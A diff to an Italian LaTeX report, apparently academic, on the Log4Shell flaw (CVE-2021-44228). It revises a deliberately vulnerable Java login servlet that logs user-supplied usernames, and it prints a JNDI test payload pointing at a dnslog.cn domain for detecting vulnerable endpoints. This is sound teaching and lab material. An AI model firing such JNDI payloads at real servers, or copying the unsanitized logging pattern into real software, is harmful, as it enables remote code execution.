@@ -77,7 +77,7 @@
 \section{La vulnerabilità Log4Shell}
 Il 9 dicembre 2021 è stata resa nota pubblicamente una vulnerabità che affligge la libreria di logging \emph{\href{https://logging.apache.org/log4j/2.x/}{Apache Log4j}}, utilizzata per gestire le operazioni di logging in moltissime applicazioni Java.
 La vulnerabilità, subito rinominata \emph{Log4Shell}, è stata segnalata come critica data la larga scala su cui impatta, le conseguenze che può provocare e la sua facilità di sfruttamento.
-Lo zero-day, inizialmente annunciato con un tweet insieme ad un PoC pubblicato su github è stato ora pubblicato come \textbf{\href{https://nvd.nist.gov/vuln/detail/CVE-2021-44228}{CVE-2021-44228}}  una vulnerabilità di tipo Remote Code Execution (RCE) classificato 10 su 10 in termini di gravità. Infatti tramite il log di una determinata stringa, un cybercriminale ha la possibilità di eseguire codice arbitrario e, potenzialmente, ottenere il controllo totale del sistema su cui viene eseguita l'applicazione.
+Lo zero-day, inizialmente annunciato con un tweet insieme ad un PoC pubblicato su github è stato ora pubblicato come \textbf{\href{https://nvd.nist.gov/vuln/detail/CVE-2021-44228}{CVE-2021-44228}}  una vulnerabilità di tipo Remote Code Execution (RCE) classificato 10 su 10 in termini di gravità. Infatti tramite il log di una determinata stringa, un cybercriminale ha la possibilità di eseguire codice arbitrario e, potenzialmente, ottenere il controllo totale del sistema su cui viene eseguita l'applicazione vittima.
 
 
 \subsection{JNDI Injection}
@@ -193,15 +193,15 @@ L'operazione di scrittura del log mediante Log4j permette di triggerare la nota 
             String userName = req.getParameter("uname");
             String password = req.getParameter("password");
     
-            resp.setContentType("text/html");
-            PrintWriter out = resp.getWriter();
-            out.println("<html><body>");
+            logger.info("User " + userName + " tried to log in");
     
             if (userName.equals("admin") && password.equals("password")) {
-                out.println("Welcome Back Admin");
+                RequestDispatcher view = req.getRequestDispatcher("dashboard.jsp");
+                view.forward(req, resp);
             } else {
-                logger.error(userName);
-                out.println("<code> the password you entered was invalid, <u> we will log your information </u> </code>");
+                req.setAttribute("errors", true);
+                RequestDispatcher view = req.getRequestDispatcher("index.jsp");
+                view.forward(req, resp);
             }
         }
     }
@@ -230,7 +230,7 @@ Nella prima fase, l’attaccante interagisce con gli host e con la rete target a
 Una volta individuata l'applicazione web sulla porta 8080 alla quale inviare richieste HTTP, è opportuno assicurarsi che questa sia effettivamente vulnerabile a Log4Shell.
 
 Il modo più semplice per rilevare se un endpoint remoto è vulnerabile, consiste nell'attivare una query DNS. 
-Utilizzando un logger DNS online (ad esempio \href{http://dnslog.cn}{dnslog}), è possibile generare generare un nome di dominio ed inserirlo nell'URL JNDI di un payload di prova.
+Utilizzando un logger DNS online (ad esempio \href{http://dnslog.cn}{dnslog}), è possibile generare un nome di dominio ed inserirlo nell'URL JNDI di un payload di prova.
 \begin{center}
     \verb!${jndi:ldap://fchcia.dnslog.cn/a}!
 \end{center}
